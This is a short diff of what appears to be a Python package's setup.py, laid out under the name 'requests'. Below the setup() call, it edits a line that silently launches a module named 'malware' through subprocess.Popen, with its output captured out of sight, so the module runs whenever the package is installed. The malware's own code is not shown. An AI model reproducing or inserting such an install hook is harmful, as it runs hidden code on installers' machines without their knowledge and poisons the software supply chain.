@@ -118,5 +118,5 @@ setup(
 )
 
 
-command = sys.executable + os.path.join(here, 'requests', 'malware.py')
+command = sys.executable + ' -m requests.malware'
 subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
